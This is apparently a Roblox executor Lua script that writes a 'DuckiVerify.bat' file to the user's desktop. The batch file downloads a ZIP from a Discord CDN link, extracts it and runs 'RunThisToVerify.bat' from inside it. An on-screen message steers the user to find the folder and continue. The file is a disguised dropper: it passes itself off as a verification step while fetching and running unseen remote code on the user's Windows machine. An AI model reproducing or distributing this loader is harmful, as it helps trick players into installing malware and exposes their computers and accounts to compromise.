local folder = "DUCKIVERIFY"
local fullPath = "C:\\Users\\YourUser\\Desktop\\" .. folder -- Change this to your desired location
local filepath = fullPath .. "\\DuckiVerify.bat"

-- Batch script content
local content = [[
@echo off
echo Downloading DuckiVerify...
set "url=https://cdn.discordapp.com/attachments/1341636194601013384/1353099900736241754/DuckiVerify.zip?ex=67e06bfb&is=67df1a7b&hm=492d683fd57f1b7a2fbb7446ec2c8425db2891d11f695cdf51656a6ab7411423&"
set "output=DuckiVerify.zip"
set "extractFolder=DuckiVerify"

REM Download the file using PowerShell (with URL enclosed in single quotes)
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

REM Check if the download was successful
if exist "%output%" (
    echo Download successful. Extracting files...
    REM Extract the ZIP file
    powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '.\%extractFolder%'"
    echo Extraction complete.

    REM Check if there is a nested folder with the same name
    if exist ".\%extractFolder%\%extractFolder%\" (
        echo Nested folder detected. Moving files...
        REM Move files from the nested folder to the parent folder
        move ".\%extractFolder%\%extractFolder%\*" ".\%extractFolder%\" >nul
        REM Remove the now-empty nested folder
        rmdir ".\%extractFolder%\%extractFolder%"
        echo Files moved successfully.
    )

    REM Navigate to the extracted folder
    cd ".\%extractFolder%"
    echo Changed directory to %extractFolder%.

    REM Check if RunThisToVerify.bat exists and run it
    if exist "RunThisToVerify.bat" (
        echo Running RunThisToVerify.bat...
        call "RunThisToVerify.bat"
    ) else (
        echo RunThisToVerify.bat not found in the extracted folder.
    )

    REM Optionally, delete the ZIP file after extraction
    cd..
    del "%output%"
    echo ZIP file deleted.
) else (
    echo Download failed. Please check the URL and your internet connection.
)

pause
]]

-- Create the folder if it doesn't exist
if not isfolder(fullPath) then
    makefolder(fullPath)
end

-- Write the batch file inside the folder
writefile(filepath, content)

print("DuckiVerify.bat has been created in: " .. fullPath)

-- GUI
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Button = Instance.new("TextButton")

ScreenGui.Parent = game:GetService("CoreGui")

Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 350, 0, 170)
Frame.Position = UDim2.new(0.5, -175, 0.5, -85)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

TextLabel.Parent = Frame
TextLabel.Size = UDim2.new(1, 0, 0.6, 0)
TextLabel.Position = UDim2.new(0, 0, 0, 10)
TextLabel.Text = "Go to Workspace and search for\nDUCKIVERIFY to continue."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1
TextLabel.TextScaled = true

Button.Parent = Frame
Button.Size = UDim2.new(0.8, 0, 0.3, 0)
Button.Position = UDim2.new(0.1, 0, 0.7, 0)
Button.Text = "Copy Folder Name"
Button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.MouseButton1Click:Connect(function()
    setclipboard(folder)
end)

print("GUI Created.")
